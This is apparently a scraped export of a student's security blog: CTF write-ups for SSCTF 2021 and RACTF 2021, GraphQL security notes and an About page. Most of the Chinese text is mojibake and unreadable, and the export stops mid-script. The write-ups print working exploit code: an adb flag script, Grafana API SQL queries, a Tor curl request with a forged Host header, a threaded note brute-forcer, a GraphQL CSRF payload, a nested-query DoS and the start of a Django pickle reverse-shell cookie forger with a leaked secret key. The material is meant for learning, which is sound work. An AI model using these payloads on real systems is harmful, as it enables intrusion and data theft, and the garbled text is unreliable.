èœé¸¡ åˆ«éª‚äº†ï¼‰ï¼Œæ‰€ä»¥ä¸‹é¢å°±æ˜¯å¤§æ¦‚ç¿»è¯‘ä¸€ä¸‹wpï¼Œå¾ˆæ°´\nå…ˆè¿æ¥ä¸Šadb connect adbaby.sstf.site:6666ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªé­”æ”¹è¿‡çš„adbï¼Œå±è”½äº†shellå’Œä¸»è¦åŠŸèƒ½ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨push/pullï¼Œå±äºæ–‡ä»¶ç®¡ç†ç±»çš„å‘½ä»¤ï¼ˆå…¨éƒ¨æŒ‡ä»¤å‚è§-\u0026gt;ä½ ç¡®å®šå·²ç»æŒæ¡äº†adbçš„ä½¿ç”¨ï¼Ÿ\nadb pull /proc/self/exe adbabyæ‹¿åˆ°æ–‡ä»¶ç”¨IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°flagçš„è·¯å¾„åœ¨/data/local/tmp/flagå¤„ï¼Œä½†ç›´æ¥ç”¨adb pullæ˜¯ä¸å¯è¾¾çš„ï¼Œå› ä¸ºå¯¹./, ../, data, local, tmp, flagè¿™äº›å­—çœ¼è¿›è¡Œäº†è¿‡æ»¤\næœ‰ä¸€ä¸ªè‡ªå®šçš„serviceåä¸ºadb Flag Serviceï¼Œå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œmd5åå¼€å¤´æ˜¯0123456çš„è¯å°±å¯ä»¥æ‹¿åˆ°flagï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹ 415349420009\nfrom adb import adb_commands device = adb_commands.AdbCommands() device.ConnectDevice(serial=\u0026#39;adbaby.sstf.site:6666\u0026#39;) conn = device.protocol_handler.Open(device._handle, b\u0026#39;flag:\u0026#39;) def sendafter(*args): print(device.protocol_handler.InteractiveShellCommand(conn, *args).decode()) sendafter() sendafter(\u0026#39;415349420009\u0026#39;) SCTF{Do_Uth1nk_th1s_1s_adb}\n","date":"2021-09-05T11:09:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/","section":"posts","tags":["wp"],"title":"SSCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"GraphQLç®€è¿° GraphQLæ˜¯ä¸€ç§é’ˆå¯¹Graphï¼ˆå›¾çŠ¶æ•°æ®ï¼‰æŸ¥è¯¢å¾ˆæœ‰ä¼˜åŠ¿çš„Query Languageï¼ˆæŸ¥è¯¢è¯­è¨€ï¼‰ï¼Œè€Œæ¶‰åŠåˆ°å­˜å‚¨æ—¶å¯ä»¥é€‰æ‹©NoSQL, SQLæˆ–å…¶å®ƒä»»æ„å­˜å‚¨æ–¹å¼ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ã€å­˜å†…å­˜é‡Œç­‰ï¼‰ï¼›è¿™æ˜¯ä¸€é—¨ä¾¿äºå‰åç«¯äº¤äº’çš„è¯­è¨€ï¼Œè€Œä¸æ˜¯ä¾¿äºåç«¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­è¨€ã€‚\nåº”ç”¨GraphQLçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å‰ææ˜¯åç«¯æ•°æ®å·²ç»ä»¥å›¾çš„ç»“æ„è¿›è¡Œä¿å­˜ï¼Œï¼ˆå¹¶ä¸”ä¸€å®šæƒ…å†µä¸‹å·²ç»è®¾ç½®å¥½åŸºäºéšç§çš„è®¿é—®æ§åˆ¶ æˆæƒä¸é‰´æƒï¼Œå¦åˆ™ä¼šç›´æ¥è¢«æ”»å‡»è€…æ‰§è¡Œé«˜å±æ“ä½œï¼‰ã€‚æ¯æ¬¡æŸ¥è¯¢æˆ–æ›´æ–°éƒ½æœ‰è‡ªå·±çš„æ ¹èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®æ˜¯æ ‘çŠ¶ç»“æ„ï¼›å¦‚æœå¸Œæœ›ä»¥å›¾çš„å½¢å¼å±•ç¤ºåˆ™å‰ç«¯ä¸èƒ½ç®€å•çš„å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œé‚£å¿…é¡»ä½¿ç”¨ç›¸åº”çš„å­˜å‚¨æ•°æ®åº“ï¼Œé€šè¿‡é¡¶ç‚¹çš„IDæŠŠä¸åŒèŠ‚ç‚¹ä¹‹é—´çš„æŸäº›è¾¹é‡æ–°è¿æ¥èµ·æ¥ã€‚\nå¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿ç§»åˆ°GraphQLï¼Œå¦‚æœRESTful APIå·²ç»èƒ½æ»¡è¶³éœ€æ±‚çš„è¯ã€‚\nGraphQL is basically just sugar for a simply typed lambda calculus.\nå˜æ›´ - Mutations three important things:\nmutations are just queries in different namespace, but do NOT mix them;\narguments require Input Objects, not normal Objects;\nuse xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)\nå†…çœ - introspection GraphQL å…è®¸åœ¨æŸ¥è¯¢çš„ä»»ä½•ä½ç½®è¯·æ±‚ __typenameï¼Œä¸€ä¸ªå…ƒå­—æ®µ(Meta fields)ï¼Œä»¥è·å¾—é‚£ä¸ªä½ç½®çš„å¯¹è±¡ç±»å‹åç§°ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ __schema å­—æ®µæ¥å‘ GraphQL è¯¢é—®å“ªäº›ç±»å‹æ˜¯å¯ç”¨çš„ï¼Œç±»å‹æœ‰ä»¥ä¸‹è¿™äº›ï¼š\nQuery, Character, Human, Episode, Droid - è¿™äº›æ˜¯æˆ‘ä»¬åœ¨ç±»å‹ç³»ç»Ÿä¸­å®šä¹‰çš„ç±»å‹ã€‚ String, Boolean - è¿™äº›æ˜¯å†…å»ºçš„æ ‡é‡ï¼Œç”±ç±»å‹ç³»ç»Ÿæä¾›ã€‚ __Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive - è¿™äº›æœ‰ç€ä¸¤ä¸ªä¸‹åˆ’çº¿çš„ç±»å‹æ˜¯å†…çœç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚ æ•æ„Ÿä¿¡æ¯æ³„éœ²\u0026amp;è¶Šæƒ è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ/è§£æ - graphdoc | graphql-playground | graphql-voyager \u0026hellip;\u0026hellip;\nç”±äºå¯¹å¯¹è±¡æˆ–å±æ€§çš„æƒé™æ§åˆ¶ä¸å®Œå–„ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ¡ˆä¾‹ï¼šhackerone ä¸€ç³»åˆ—ä¿¡æ¯æ³„éœ²æ¼æ´\nåœ¨objects.typesä¸­å¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚email, password, secretkey, token, licensekey, sessionç­‰ï¼Œå¤šå¤šå…³æ³¨åºŸå¼ƒå­—æ®µï¼ˆdeprecated fields)ã€‚å½“å­—æ®µè¢«åºŸå¼ƒåç›´æ¥ç”¨__typeåšå†…çœç¡®å®æŸ¥æ‰¾ä¸åˆ°ï¼Œä½†å½“æŒ‡å®šincludeDreprecated: trueæ—¶ï¼Œ__typeä»ç„¶å¯ä»¥å°†åºŸå¼ƒå­—æ®µæš´éœ²å‡ºæ¥ã€‚\nGraphQLçš„è®¤è¯æ–¹å¼ GraphQLå¹¶æ²¡æœ‰è§„å®šä»»ä½•èº«ä»½è®¤è¯å’Œæƒé™æ§åˆ¶çš„ç›¸å…³å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´çµæ´»çš„åœ¨åº”ç”¨ä¸­å®ç°å„ç§ç²’åº¦çš„è®¤è¯å’Œæƒé™ï¼›ä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºä¸€äº›â€œè£¸å¥”â€çš„æ¥å£æˆ–æ— æ•ˆè®¤è¯æ— æ•ˆçš„æ¥å£ã€‚\nç‹¬ç«‹è®¤è¯ç»ˆç«¯ (RESTful) é€šç”¨ä¸”å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œå¦‚æœåç«¯æœ¬èº«æ”¯æŒRESTfulæˆ–æœ‰ä¸“é—¨çš„è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥ä¿®æ”¹å°‘é‡ä»£ç å®ç°GraphQLæ¥å£çš„è®¤è¯ã€‚\nä¸¾ä¾‹ï¼šæ·»åŠ jwtè®¤è¯\nåœ¨GraphQLå†…è®¤è¯ å¦‚æœGraphQLçš„åç«¯æ”¯æŒGraphQLä¸èƒ½æ”¯æŒRESTfulï¼Œæˆ–å…¨éƒ¨è¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨GraphQLï¼Œä¹Ÿå¯ä»¥ç”¨æ„é€ ç›¸å…³çš„Query Schemaæ¥å£è¿”å›tokençš„å½¢å¼ã€‚\nä¸¾ä¾‹ï¼šæ„é€ loginçš„Query Schemaï¼Œåœ¨è¿”å›å€¼ä¸­æºå¸¦token\ntype Query{ login( username: String! password: String! ): LoginMsg type LoginMsg{ message: String token: String } } åœ¨resolverä¸­æä¾›ç™»å½•é€»è¾‘\nimport bcrypt from \u0026#39;bcrptjs\u0026#39;; import jsonwebtoken from \u0026#39;jsonwebtoken\u0026#39;; export const login = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const{username, password} = args; const user = await db.collection(\u0026#39;User\u0026#39;).findOne({username: username}); if(await bcyrpt.compare(password, user.password)){ return{ message: \u0026#39;Login success\u0026#39;, token: jsonwebtoken.sign({ user: user, exp: Math.floor(Date.now() / 1000) + (60 * 60), }, \u0026#39;your secret\u0026#39;), }; } } ç™»å½•æˆåŠŸå æˆ‘ä»¬æŠŠtokenè®¾ç½®åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç»§ç»­è¯·æ±‚GraphQLçš„å…¶ä»–æ¥å£ï¼Œè¿™æ—¶éœ€è¦å¯¹ApolloServerè¿›è¡Œå¦‚ä¸‹é…ç½®\nconst server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || \u0026#39;\u0026#39;; const user = getUser(token); return{ ...user, ...ctx, ...app.context }; }, }); å®ç°getUserå‡½æ•°\nconst getUser = (token) =\u0026gt; { let user = null; const parts = token.split(\u0026#39; \u0026#39;); if(parts.length === 2){ const scheme = parts[0]; const credentials = parts[1]; if(/^Bearer$/i.test(scheme)){ token = credentials; try{ user = jwt.verify(token, JWT_SECRET); console.log(user); }catch(e){ console.log(e); } } } return user } é…ç½®å¥½ApolloServeråï¼Œåœ¨resolverä¸­æ ¡éªŒuser\nimport {ApolloError, ForbiddenError, AuthenticationError} from \u0026#39;apollo-server\u0026#39;; export const blogs = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const user = context.user; if(!user){ throw new AuthenticationError(\u0026#39;You must be logged in to see blogs\u0026#39;); } const {blogId} = args; const cursor = {}ï¼› if(blogId){ cursor[\u0026#39;_id\u0026#39;] = blogId; } const blogs = await db .collection(\u0026#39;blogs\u0026#39;) .find(cursor) .sort({publishedAt: -1}) .toArray(); return blogs; } æ›´å¤šå®‰å…¨æ¼æ´ Express-GraphQLï¼š\næ¡†æ¶é»˜è®¤æ— é˜²æŠ¤ è‡ªå¸¦GraphiQL Graphene-Djangoï¼š\nä¾èµ–Djangoçš„å®‰å…¨é…ç½®ï¼ˆSecure As Defaultï¼‰ è‡ªå¸¦GraphiQL GraphQL-PHP\næ— å…³æ¡†æ¶ Express-GraphQL Endpoint CSRFæ¼æ´ {\u0026#34;query\u0026#34;:\u0026#34;mutation {\\n editProfile(name:\\\u0026#34;hacker\\\u0026#34;, age: 5) {\\n name\\n age\\n }\\n}\u0026#34;,\u0026#34;variables\u0026#34;:null} å°†Content-Typeä¿®æ”¹ä¸ºapplication/x-www-form-urlencodeï¼Œä»å¯æˆåŠŸæ‰§è¡Œ\nquery=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20 5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D ç›´æ¥é…åˆburpè‡ªå¸¦çš„Generate CSRD POC\nGraphiQL Clickjacking æ¼æ´ å‚è§ï¼šhttps://github.com/graphql/graphiql/issues/683\nå¯ä»¥é…åˆburpè‡ªå¸¦çš„Clickbanditè¿›è¡Œæ”»å‡»\nGraphQL injection æ¼æ´ è¿™æ˜¯ä¸€ä¸ªç›¸å½“å…¨çš„payloads\u0026amp;exps | è¿™æ˜¯ä¸€ä¸ªè‡ªçœpayload\npç¥ppté‡Œçš„ç¤ºæ„å›¾ç›´æ¥æ¬è¿‡æ¥äº†\nä»ç„¶æ˜¯æ‹¼æ¥äº†æ¶æ„çš„GraphQLè¯­å¥å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ§åˆ¶ä¸ä¸¥æ ¼ï¼›åŒç±»çš„æ¼æ´è¿˜æœ‰xss, rceç­‰ç­‰\næœ‰è¯­æ³•å°±æœ‰è§£æï¼Œæœ‰è§£æå°±ä¼šæœ‰ç»“æ„å’Œé¡ºåºï¼Œæœ‰ç»“æ„å’Œé¡ºåºå°±ä¼šæœ‰æ³¨å…¥ã€‚\nç”¨â€œå‚æ•°åŒ–æŸ¥è¯¢â€çš„æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜æ—¶ï¼Œè¦ç¡®ä¿åç«¯çš„è§£æå¼•æ“æ²¡æœ‰å¤§ç—…\né€šè¿‡Custom Scalarçš„æ³¨å…¥ (JSON) NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of \u0026lsquo;custom scalar types\u0026rsquo;\nâ€”â€”â€”â€”æ›´å¤šçš„GraphQLiç›¸å…³é—®é¢˜å¯å‚è§è¿™ä¸ªgitä»“åº“ï¼Œä¸€æœ¬æ»¡è¶³ï¼ˆ\næ‹’ç»æœåŠ¡ GraphQLä¸­çš„queryå’Œmutationçš„è¿”å›ç»“æœéƒ½æ˜¯å¯ä»¥æœ‰åµŒå¥—çš„å¯¹è±¡çš„ï¼Œå¦‚æœä¸å¯¹åµŒå¥—æ·±åº¦è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½è¢«åˆ©ç”¨ä»è€Œè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nä¸€ä¸ªä¸¾ä¾‹ï¼š\nå®šä¹‰äº†Blogå’ŒAuthor:\ntype Blog{ _id: String! type: BlogType avatar: String title: String content: [String] author: Author .... } type Author{ _id: String! name: String blog: [Blog] } éƒ½æœ‰å„è‡ªçš„Query:\nextend type Query{ blogs( blogId: ID systemType: String! ): [Blog] } extend type Query{ author( _id: String ): Author } æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢ï¼Œæ— é™å¥—å¨ƒå¯¼è‡´dos\nquery GetBlogs($blogId: ID, $systemType: String!) { blogs(blogId: $blogId, systemType: $systemType) { _id title type content author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name # and so on... } } } } } } } } } } } } } title createdAt publishedAt } } publishedAt } } è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦åœ¨GraphQLæœåŠ¡å™¨ä¸Šé™åˆ¶æŸ¥è¯¢æ·±åº¦ï¼ŒåŒæ—¶è®¾è®¡GraphQLæ¥å£æ—¶å°½é‡é¿å…å‡ºç°æ­¤ç±»é—®é¢˜ï¼Œä»¥Node.jsä¸ºä¾‹ï¼Œgraphql-depth-limitå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜\n// ... import depthLimit from \u0026#39;graphql-depth-limit\u0026#39;; // ... const server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || \u0026#39;\u0026#39;; const user = getUser(token); console.log(\u0026#39;user\u0026#39;, user) return{ ...user, ...ctx, ...app.context }; }, validationRules: [ depthLimit(10) ] }); // ... Graphene-Django DEBUGæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜ åœ¨CTFä¸­çš„è¡¨ç° [HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n[corCTF 2021]devme\nç»“å°¾ Damn Vulnerable GraphQL Application-\u0026gt; ä¸€ä¸ªæ¼æ´å¤ç°çš„é¶åœºï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°å’Œæ²¡æåˆ°çš„GraphQLå­˜åœ¨çš„æ´\ndocker pull dolevf/dvga docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga å·²ç»æœ‰å†™å¥½çš„wpäº† ä¸å‘äº’è”ç½‘äº§å‡ºæ¹¿åƒåœ¾ ä»æˆ‘åšèµ·\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ ä¸­æ–‡å®˜ç½‘\nåœ¨çº¿GraphiQL\nlearn-graphql\nä»€ä¹ˆæ˜¯ GraphQLï¼Ÿ\nç©è½¬graphQL\nGraphQL ä»å…¥é—¨åˆ°å®è·µ\nã€CuteJavaScriptã€‘GraphQLçœŸé¦™å…¥é—¨æ•™ç¨‹\næ”»å‡»GraphQL\nGraphQLå®‰å…¨æŒ‡åŒ—\nUWP GraphQLæ•°æ®æŸ¥è¯¢çš„å®ç°\nGraphQL Mutations\nGraphQL NoSQL Injection Through JSON Types\nGraphQL Injection\nã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰\nã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸‹ï¼‰\n[HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\nå¼€å­¦äº†ï¼Œä¸æ‘†çƒ‚ä»æˆ‘åšèµ·\n","date":"2021-09-03T20:56:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/03/graphql-study-notes/","section":"posts","tags":["GraphQL"],"title":"GraphQLå­¦ä¹ ç¬”è®°"},{"categories":[],"contents":"ä½ å¥½å‘€ï¾Ÿâˆ€ï¾Ÿ)ãƒ\nè¿™é‡Œæ˜¯è‘µå­ï¼Œä¸€ä¸ªä¿¡å®‰ä¸“ä¸šçš„æ™®é€šå¤§äºŒå­¦ç”Ÿï¼ŒV\u0026amp;Nåˆ’æ°´æ‘¸é±¼\nè¶…é«˜æ ¡çº§ç½‘ä¸Šå†²æµªçˆ±å¥½è€…ï¼Œå–œæ¬¢çœ‹ä¹¦ï¼Œå¬æ­Œå’Œæ€è€ƒäººç”Ÿï¼Œå–œæ¬¢æ‰“éŸ³æ¸¸å’Œä¸€äº›å•æœºæ¸¸æˆï¼Œè¿åŠ¨ç»†èƒä¸º0\nctf webæ–¹å‘çš„çœ‹é¢˜é€‰æ‰‹ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆåªæ˜¯çœ‹é¢˜ é—®å°±æ˜¯ç­¾åˆ°é¢˜éƒ½ä¸ä¼šï¼‰ï¼Œä¸è¿‡äººèœç˜¾å¤§ï¼Œæ—¥å¸¸çç¢ç£¨ï¼Œçç ”ç©¶ï¼›å…´è¶£é©±åŠ¨å‹ï¼Œæœ‰ä¸€é¢—æƒ³æˆä¸ºå…¨æ ˆçš„å¿ƒï¼ˆæ¢¦æƒ³è¿˜æ˜¯è¦æœ‰çš„ï¼Œæ—¥æ‹±ä¸€å’ï¼Œè¯´ä¸å®šå°±å®ç°äº†x\nåœ¨åŠªåŠ›è®©è‡ªå·±çœ‹èµ·æ¥ä¸é‚£ä¹ˆèœï¼Œè¿›åº¦0/nï¼ˆå·²ç»è„±ç¦»è´Ÿæ•°äº†ï¼å¥½æ¶ˆæ¯ï¼‰\nè‡´åŠ›äºç‚¹å‡ºä¸€æ£µèŒ‚ç››ã€æµ“å¯†çš„æŠ€èƒ½æ ‘ã€‚æ—¢ç„¶â€œä»¥æœ‰æ¶¯éšæ— æ¶¯â€ä¼šdie();ï¼Œé‚£å°±è®¾å¥½æ–­ç‚¹ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æ…¢æ…¢debugï¼Œè¯´ä¸å®šå°±Bypassäº†å‘¢ï¼Ÿ\nè¿™ä¸ªå°å°çš„åšå®¢ä¼šåŒ…å«ä¸€äº›ç²—ç³™ä½†è´¨æœ´çš„ç¬”è®°å’Œç²¾è‡´ä¸”åŒæ ·ç”¨å¿ƒçš„wpï¼Œè¿˜ä¼šæœ‰ä¸€äº›ä¿¡æ‰‹å†™å°±çš„æ–‡å­—ï¼Œäº21å¹´7æœˆåº•å¼€å¼ ã€‚\nè™½ç„¶ç°åœ¨åªæœ‰ä¸€äº›å«æ°´é‡å¾ˆé«˜ã€æŠ€æœ¯åŠ›å¾ˆä½çš„äº’è”ç½‘æ¹¿åƒåœ¾ï¼Œä½†æœªæ¥è¿™é‡Œä¸€å®šä¼šæœ‰è‡ªå·±çš„åŸåˆ›äº§å‡ºï¼›è™½ç„¶ç°åœ¨å°ç«™é—¨å¯ç½—é›€ï¼Œä½†å¸Œæœ›æœ‰ä¸€å¤©å¯ä»¥ä¸ºæ›´å¤šçš„äººå¸¦æ¥å¸®åŠ©ï¼›å¸Œæœ›åœ¨å­¦å®‰å…¨çš„é“è·¯ä¸Šä¸€ç›´èµ°ä¸‹å»\nstay hungry, stay foolish.\nI wanna be defined by the things that I love\nNot the things I hate\nNot the things I\u0026rsquo;m afraid of, I\u0026rsquo;m afraid of\nOr the things that haunt me in the middle of the night\nI, I just think that\nYou are what you love\n","date":"2021-08-25T01:39:57+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":["CTF"],"contents":"https://2021.ractf.co.uk/\nhttps://github.com/ractf/challenges/tree/master/2021\nhttps://github.com/404dcd/RACTF-challenges\nhttps://blog.ractf.co.uk/tag/ractf-2021/\nWeb/Really Awesome Monitoring Dashboard ğŸŒŸ Perfect infrastructure ğŸŒŸ\næ˜¯grafana\nä½†æ˜¯ç‰ˆæœ¬ä¹Ÿå¤ªæ–°äº†å§8.1.1ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¸åœçš„è¯·æ±‚å„ç§apiï¼Œå…¶ä¸­æœ‰ä¸ª/api/ds/queryï¼Œä»¥æ˜æ–‡æ–¹å¼è¯·æ±‚æ•°æ®åº“å†…å®¹\né‚£è¿™å°±å¥½è¯´äº†ï¼Œç›´æ¥æ˜ç‰Œäº†éƒ½\nSELECT name FROM sqlite_master WHERE type =\u0026#39;table\u0026#39; AND name NOT LIKE \u0026#39;sqlite_%\u0026#39;; SELECT * FROM flags; â€”â€”â€”â€”è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å¯¹äºæƒé™çš„è®¾ç½®æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸è¦éšä¾¿æŠŠapiæ¥å£æš´éœ²å‡ºæ¥ï¼Œä¹Ÿä¸è¦æ˜æ–‡ä¼ é€’ä¿¡æ¯\nWeb/Really Awesome Hidden Service Ahoy, matey! Some dirty scallywags seem to not be respectin\u0026rsquo; th\u0026rsquo; pirate code! Teach them a lesson by findin\u0026rsquo; out who they be.\nractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion ä¸€ä¸ªTorçš„ç½‘ç«™ï¼Œèµ°åŒ¿åæ–¹å¼\né‚£é¦–å…ˆè¦æŠŠéšè—åœ¨åé¢çš„çœŸå®ipç»™æ‰¾å‡ºæ¥ã€‚æ•´ä¸ªç½‘é¡µçš„å†…å®¹æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä½†æ˜¯é€šå¸¸å®¹æ˜“è¢«å¿½ç•¥çš„æ˜¯faviconå›¾åƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒè¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼šHunting phishing websites with favicon hashes\nè¿™é‡Œå¯ä»¥ç”¨fav-upä¸€æŠŠæ¢­ï¼ˆä¹Ÿå°±æ˜¯è‡ªåŠ¨åŒ–äº†æå–å›¾æ ‡-\u0026gt;è®¡ç®—mmhashå€¼-\u0026gt;shodanæœç´¢å‡ºipè¿™ä¸ªè¿‡ç¨‹ï¼‰ï¼Œå¾—åˆ°ipä¸º178.62.4.214|178.62.15.164\nractf{DreadingPirates}\nâ€”â€”â€”â€”é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸè§£ï¼Œå½“ç”¨éæ³•çš„host headerè¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥è¿”å›flag\n$ curl -s --socks5-hostname localhost:9050 -H \u0026#34;Host: asd.com\u0026#34; ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion | grep \u0026#34;ractf\u0026#34; All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.\nWeb/Emojibook The flag is at /flag.txt\nå¯ä»¥ç™»å½•ã€æ³¨å†Œè´¦æˆ·ã€å‘å¸ƒnoteã€æŸ¥çœ‹ï¼Œç»™å‡ºäº†æºç \nçœ‹æºç ï¼Œæ˜¯djangoæ¡†æ¶çš„åç«¯ï¼Œç›´å¥”settings.py\nçœ‹åˆ°äº†ç†Ÿæ‚‰çš„pickle\nåœ¨ä»…æœ‰çš„è¿™ä¸ªappçš„view.pyä¸­æœ‰è¿™æ ·çš„ä»£ç ï¼Œä¼šåœ¨noteçš„bodyéƒ¨åˆ†åŒ¹é…{{.*?}}è¿™æ ·çš„å†…å®¹å¹¶å°†å…¶ä¸­çš„éƒ¨åˆ†æ‹¼æ¥åˆ°/emoji/åä»¥imageçš„å½¢å¼åŠ è½½å‡ºæ¥ï¼Œä½†æ˜¯ç›´æ¥ç”¨{{/flag.txt}}æ˜¯ä¸å¯ä»¥çš„ï¼Œè¿™éƒ¨åˆ†ä»£ç åœ¨forms.pyä¸­\næ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯ {..{/flag.txt}..}\nractf{dj4ng0_lfi}\nâ€”â€”â€”â€”ç„¶è€Œè¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œurléƒ¨åˆ†å¯ä»¥ç›´æ¥ä¿®æ”¹noteç¼–å·è¾¾åˆ°æ°´å¹³è¶Šæƒï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡çˆ†ç ´æ–¹å¼æ‰¾åˆ°ä¹‹å‰å·²ç»æˆåŠŸçš„note\nimport logging import threading import time import requests def thread_function(name): try: r=requests.get(\u0026#34;http://193.57.159.27:30160/\u0026#34;+str(name)) if (\u0026#34;base64\u0026#34; in r.text and \u0026#34;cmFjdGZ7\u0026#34; in r.text): print(r.text) except: pass if __name__ == \u0026#34;__main__\u0026#34;: threads = list() for index in range(1000): x = threading.Thread(target=thread_function, args=(index,)) threads.append(x) x.start() for index, thread in enumerate(threads): thread.join() Web/Emojybook 2 no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile\nThe flag is at /flag.txt\nè·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ¨¡ä¸€æ ·ï¼Œç„¶è€Œè¿™æ¬¡å†ç”¨ä¹‹å‰çš„ {..{/flag.txt}..}ä¼šè¿”å›500é”™è¯¯ï¼Œè¿™å›å°±è¦ç”¨ä¸Šä¹‹å‰å®Œå…¨æ²¡ç”¨åˆ°çš„pickle session cookieäº†ã€‚\nå…ˆè¯»ä¸€ä¸‹/app/notebook/settings.pyï¼Œå¾—åˆ°secret_keyï¼Œç„¶åæä¸€ä¸ªåå¼¹shellçš„cookieå‡ºæ¥\n# Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ #!/usr/bin/python import django.core.signing, django.contrib.sessions.serializers from django.http import HttpResponse from django.conf import settings import pickle import os import requests SECRET_KEY = \u0026#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7\u0026#34;(S3xv,{sp)Xaqg?2pj2=hFCgN\u0026#34;CR\u0026#34;UPn4\u0026#39; settings.configure(DEFAULT_HASHING_ALGORITHM=\u0026#34;sha256\u0026#34;) # Initial cookie when visiting the page cookie=\u0026#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM\u0026#34; newContent = 